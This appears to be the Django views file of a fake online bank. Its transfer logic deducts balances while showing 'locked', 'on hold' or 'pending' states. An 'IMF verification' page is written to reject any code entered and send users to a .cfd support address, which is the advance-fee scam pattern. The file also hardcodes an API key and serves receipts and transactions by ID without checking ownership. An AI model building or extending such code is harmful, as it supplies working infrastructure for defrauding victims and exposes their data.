from django.shortcuts import render, redirect, get_object_or_404
from django.contrib.auth.models import  auth
from django.contrib import messages
from django.contrib.auth.decorators import login_required
from .models import Portfolio, Transactions
import requests
from .forms import TransactionsForm
from django.contrib import messages
from django.db import IntegrityError
from django.core.mail import send_mail, BadHeaderError
from django.conf import settings
from django.db import transaction
from .forms import UserPortfolioForm, PortfolioForm 
from django.core.mail import send_mail
from django.conf import settings
from django.shortcuts import render
from django.contrib import messages
from .models import Portfolio
from io import BytesIO
from django.http import HttpResponse
from django.template.loader import get_template
from xhtml2pdf import pisa


# Create your views here.



def home(request):
    if request.method == 'POST':
            username = request.POST['username']
            password = request.POST['password']

            user = auth.authenticate(username = username, password= password)

            if user is not None:
                auth.login(request,user)
                return redirect('portfolio')
            else:
                messages.info(request, 'Enter a valid Account Number')
                return redirect('home')
    return render(request, 'home.html')

def about(request):
    return render(request, 'about.html')


@login_required(login_url='home')
def my_cards(request):
    portfolio = None 
    log_user = request.user
    try:
        portfolio = Portfolio.objects.get(username=log_user)
    except Portfolio.DoesNotExist:
            portfolio = None 
    return render(request, 'my-cards.html', {'portfolio': portfolio})


@login_required(login_url='home')
def contact_us(request):
    portfolio = None
    log_user = request.user

    try:
        portfolio = Portfolio.objects.get(username=log_user)
    except Portfolio.DoesNotExist:
        portfolio = None

    if request.method == "POST":
        name = request.POST.get('name')
        email = request.POST.get('email')
        message = request.POST.get('message')

        print("Received POST data:")
        print(f"Name: {name}, Email: {email}, Message: {message}")

        email_message = f"Name: {name}\nEmail: {email}\n\nMessage:\n{message}"

        try:
            send_mail(
                subject='New Contact',
                message=email_message,
                from_email=settings.EMAIL_HOST_USER,
                recipient_list=[settings.EMAIL_HOST_USER],  
                fail_silently=False,
            )
            print("Email sent successfully!")
            messages.success(request, "Thanks for contacting us! We will be in touch with you shortly.")
        except Exception as e:
            print(f"Email sending failed: {e}")
            messages.error(request, f"Failed to send message: {e}")

    return render(request, 'contact-support.html', {'portfolio': portfolio})

@login_required(login_url='home')
def profile_io(request):
    portfolio = None 
    log_user = request.user
    try:
        portfolio = Portfolio.objects.get(username=log_user)
    except Portfolio.DoesNotExist:
            portfolio = None 
    return render(request, 'profileio.html', {'portfolio': portfolio})


def exchange_rates(request):
    endpoint = "https://v6.exchangerate-api.com/v6/9633a5f18ca5b8ccc65aaa80/latest/EUR"
    response = requests.get(endpoint)
    data = response.json()
    rates = data['conversion_rates']

    return render(request, 'exchange_rates.html', {'rates': rates})



@login_required(login_url='home')
def portfolio(request):
        log_user = request.user
        portfolio_instance = None
        account_total = 0
        amount_to_transfer = None  
        last_transaction = None    
        try:
            
            portfolio_instance = Portfolio.objects.get(username=log_user)
            account_total = portfolio_instance.account_total

            last_transaction = Transactions.objects.filter(username=portfolio_instance).order_by('-transaction_date', '-id').first()
            
            

            amount_to_transfer = Transactions.objects.filter(username = portfolio_instance).order_by('-transaction_date', '-id')
        
        except Portfolio.DoesNotExist:
            pass  

        endpoint = "https://v6.exchangerate-api.com/v6/9633a5f18ca5b8ccc65aaa80/latest/EUR"
        response = requests.get(endpoint)
        data = response.json()
        rates = data['conversion_rates'] 

        transfer_message = ""
        progress = 0  
        
        if last_transaction:
            if last_transaction.transaction_type == 'Pending':
                transfer_message = f"Transfer for ${last_transaction.amount_to_transfer} pending."
                progress = 50 
            elif last_transaction.transaction_type == 'On Hold':
                transfer_message = f"Transfer for ${last_transaction.amount_to_transfer} is on hold."
                progress = 75  
            elif last_transaction.transaction_type == 'Account Locked':
                transfer_message = f"Transfer for ${last_transaction.amount_to_transfer} cannot proceed. Account is locked."
                progress = 0 

        return render(request, 'portfolio.html', {'portfolio': portfolio_instance, 'account_total': account_total, 'amount_to_transfer': amount_to_transfer, 'rates': rates, 'transfer_message': transfer_message, 'progress': progress })
    




@login_required(login_url='home')
def transfer(request):
    log_user = request.user.id
    form = TransactionsForm()
    
    try:
        sender_portfolio = Portfolio.objects.get(username=log_user)
    except Portfolio.DoesNotExist:
        sender_portfolio = None
        messages.error(request, 'Portfolio not found.')
        return redirect('portfolio')

    if request.method == 'POST':
        form = TransactionsForm(request.POST)
        if form.is_valid():
            try:
                pin = int(form.cleaned_data.get('transfer_pin'))
                amount_to_transfer = int(form.cleaned_data.get('amount_to_transfer'))
                beneficiary_email = form.cleaned_data.get('beneficiary_email')
                beneficiary_phone_number = form.cleaned_data.get('senders_phone_number')
                saved_pin = sender_portfolio.pin
                account_total = sender_portfolio.account_total

                # Successful validation case
                if pin == saved_pin and amount_to_transfer <= account_total:
                    transaction = form.save(commit=False)
                    transaction.username = sender_portfolio
                    
                    # Individual status handling with immediate redirection
                    if sender_portfolio.account_status == 'locked':
                        transaction.transaction_type = 'Account Locked'
                        transaction.save()
                        sender_portfolio.account_total -= amount_to_transfer
                        sender_portfolio.save()
                        
                        # Send locked account notification
                        try:
                            send_mail(
                                'Account Locked - Transfer Blocked',
                                f'Your transfer of {transaction.amount_sign}{amount_to_transfer} was blocked because your account is locked.',
                                settings.EMAIL_HOST_USER,
                                [beneficiary_email],
                                fail_silently=False,
                            )
                        except Exception as email_error:
                            print(f"Failed to send locked account email: {email_error}")
                        
                        return redirect('transfer_progress', transaction_id=transaction.id)
                        
                    elif sender_portfolio.account_status == 'on_hold':
                        transaction.transaction_type = 'On Hold'
                        transaction.save()
                        sender_portfolio.account_total -= amount_to_transfer
                        sender_portfolio.save()
                        
                        # Send on hold notification
                        try:
                            send_mail(
                                'Transfer On Hold',
                                f'Your transfer of {transaction.amount_sign}{amount_to_transfer} is currently on hold.',
                                settings.EMAIL_HOST_USER,
                                [beneficiary_email],
                                fail_silently=False,
                            )
                        except Exception as email_error:
                            print(f"Failed to send on hold email: {email_error}")
                        
                        return redirect('transfer_progress', transaction_id=transaction.id)
                        
                    elif sender_portfolio.account_status == 'pending_review':
                        transaction.transaction_type = 'Pending'
                        transaction.save()
                        sender_portfolio.account_total -= amount_to_transfer
                        sender_portfolio.save()
                        
                        # Send pending notification
                        try:
                            send_mail(
                                'Transfer Pending Review',
                                f'Your transfer of {transaction.amount_sign}{amount_to_transfer} is pending review.',
                                settings.EMAIL_HOST_USER,
                                [beneficiary_email],
                                fail_silently=False,
                            )
                        except Exception as email_error:
                            print(f"Failed to send pending email: {email_error}")
                        
                        return redirect('transfer_progress', transaction_id=transaction.id)
                    
                    elif sender_portfolio.account_status == 'imf_locked':
                        transaction.transaction_type = 'IMF Locked'
                        transaction.save()
                        sender_portfolio.account_total -= amount_to_transfer
                        sender_portfolio.save()
                        
                        # Send IMF locked notification
                        try:
                            send_mail(
                                'IMF Verification Required',
                                f'Your transfer of {transaction.amount_sign}{amount_to_transfer} requires IMF verification code.',
                                settings.EMAIL_HOST_USER,
                                [beneficiary_email],
                                fail_silently=False,
                            )
                        except Exception as email_error:
                            print(f"Failed to send IMF locked email: {email_error}")
                        
                        return redirect('imf_verification', transaction_id=transaction.id)
                        
                    else:  # Active account - successful transfer
                        transaction.transaction_type = 'Debit'
                        transaction.save()
                        sender_portfolio.account_total -= amount_to_transfer
                        sender_portfolio.save()
                        
                        # Send success notification
                        try:
                            send_mail(
                                'Transfer Successful',
                                f'Your transfer of {transaction.amount_sign}{amount_to_transfer} has been completed successfully.',
                                settings.EMAIL_HOST_USER,
                                [beneficiary_email],
                                fail_silently=False,
                            )
                            
                            
                        except Exception as notify_error:
                            print(f"Failed to send success notifications: {notify_error}")
                        
                        return redirect('transfer_progress', transaction_id=transaction.id)

                # Failed validation case (wrong PIN or insufficient funds)
                else:
                    error_message = (
                        'We apologize for the inconvenience. Your recent transaction was unsuccessful. '
                        'Please contact customer support at support@metroglobaltrust.com for assistance.'
                    )
                    email_message = (
                        'We regret to inform you that your recent transaction was unsuccessful.\n\n'
                        'Transaction Details:\n'
                        f'Amount: {form.cleaned_data.get("amount_sign", "$")}{amount_to_transfer}\n'
                        f'Account: {sender_portfolio.account_number}\n\n'
                        'Please reply to this email with any additional details.\n'
                    )
                    
                    messages.error(request, error_message)
                    
                    # Send failure notifications
                    try:
                        if beneficiary_email:
                            send_mail(
                                'Transaction Failed',
                                email_message,
                                settings.EMAIL_HOST_USER,
                                [beneficiary_email],
                                fail_silently=False,
                            )
                            
                        
                    except Exception as notify_error:
                        print(f"Failed to send failure notifications: {notify_error}")

            except ValueError as ve:
                messages.error(request, f'Invalid input: {ve}')
            except Exception as e:
                messages.error(request, f'An unexpected error occurred: {e}')

    return render(request, 'transfer.html', {
        'form': form,
        'portfolio': sender_portfolio,
        'account_status': sender_portfolio.get_account_status_display() if sender_portfolio else None
    })

@login_required
def imf_verification(request, transaction_id):
    transaction = get_object_or_404(Transactions, id=transaction_id)
    
    if request.method == 'POST':
        submitted_code = request.POST.get('imf_code')
        
        # Reject ANY code entered
        if submitted_code:
            messages.error(
                request,
                'Invalid IMF code. Please contact customer support at support@nextrustequity.cfd for assistance.'
            )
            
            # Optional: Log failed attempts
            print(f"Failed IMF attempt for transaction {transaction_id}. Code entered: {submitted_code}")
            
            # Keep transaction as IMF Locked (don't change status)
            return render(request, 'imf_locked.html', {
                'transaction': transaction,
                'amount': f"{transaction.amount_sign}{transaction.amount_to_transfer}"
            })
        else:
            messages.error(request, 'Please enter a code')
    
    return render(request, 'imf_locked.html', {
        'transaction': transaction,
        'amount': f"{transaction.amount_sign}{transaction.amount_to_transfer}"
    })



@login_required(login_url='home')
def transfer_progress(request, transaction_id):
    try:
        transaction = Transactions.objects.get(id=transaction_id)
        
        status_messages = {
            'Debit': f"Your transfer of {transaction.amount_sign}{transaction.amount_to_transfer} to {transaction.beneficiary_name} was successful!",
            'Pending': f"Your transfer of {transaction.amount_sign}{transaction.amount_to_transfer} is pending approval.",
            'On Hold': f"Your transfer of {transaction.amount_sign}{transaction.amount_to_transfer} is on hold. Please contact support.",
            'Account Locked': f"Your account is currently locked. Transfer of {transaction.amount_sign}{transaction.amount_to_transfer} cannot be processed.",
            'IMF Locked': f"Your transfer of {transaction.amount_sign}{transaction.amount_to_transfer} requires IMF verification.",
        }

        
        
        status_progress = {
            'Debit': 100,
            'Pending': 57,
            'On Hold': 75,
            'Account Locked': 0,
            'IMF Locked': 50,
        }

        progress = status_progress.get(transaction.transaction_type, 0)
        transfer_message = status_messages.get(transaction.transaction_type, "Transaction status unknown")

        if transaction.transaction_type == 'IMF Locked':
            return redirect('imf_verification', transaction_id=transaction.id)

        return render(request, 'transfer-progress.html', {
            'progress': progress,
            'amount_to_transfer': transaction.amount_to_transfer,
            'amount_sign': transaction.amount_sign,
            'transfer_message': transfer_message,
            'transaction': transaction
        })

    except Transactions.DoesNotExist:
        messages.error(request, 'Transaction not found.')
        return redirect('portfolio')
    

def download_receipt_pdf(request, transaction_id):
    transaction = Transactions.objects.get(id=transaction_id)
    
    template = get_template('receipt_pdf.html')
    context = {'transaction': transaction}
    html = template.render(context)
    
    result = BytesIO()
    pdf = pisa.pisaDocument(BytesIO(html.encode("UTF-8")), result)
    
    if not pdf.err:
        response = HttpResponse(result.getvalue(), content_type='application/pdf')
        response['Content-Disposition'] = f'attachment; filename="Payment_Confirmation_2025_{transaction.id}.pdf"'
        return response
    return HttpResponse("Error generating PDF", status=400)

    



###############################      LOGIN    #################################

def signin(request):
        if request.method == 'POST':
            username = request.POST['username']
            password = request.POST['password']

            user = auth.authenticate(username = username, password= password)

            if user is not None:
                auth.login(request,user)
                return redirect('portfolio')
            else:
                messages.info(request, 'Enter a valid Account Number')
                return redirect('signin')
        return render(request, 'signin.html')





        

def logout(request):
    auth.logout(request)
    return redirect('home')









